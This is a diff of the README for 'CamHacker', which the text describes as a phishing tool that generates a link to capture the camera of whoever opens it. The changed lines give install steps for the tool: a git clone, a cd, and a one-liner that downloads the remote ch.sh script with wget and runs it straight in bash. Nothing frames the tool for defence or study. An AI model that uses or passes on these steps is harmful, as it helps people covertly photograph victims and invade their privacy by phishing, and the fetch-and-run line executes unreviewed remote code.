@@ -8,15 +8,15 @@ CamHacker is a phishing tool. It will generate a link. If anyone opens the link 
 
 ### [+] Installation
 
- - `git clone https://github.com/rockyjaat47/Cam-Hacked`
- - `cd CamHacker`
+ - `git clone https://github.com/rockyjaat47/Cam-hacked`
+ - `cd Camhacked`
 
 For termux, use additional command `termux-setup-storage`
  - `bash ch.sh`
 
 ##### Or Run Directly
 ```
-wget https://raw.githubusercontent.com/rockyjaat47/Cam-Hacked/main/ch.sh && bash ch.sh
+wget https://raw.githubusercontent.com/rockyjaat47/Cam-hacked/main/ch.sh && bash ch.sh
 ```
 
 ### [+] Features
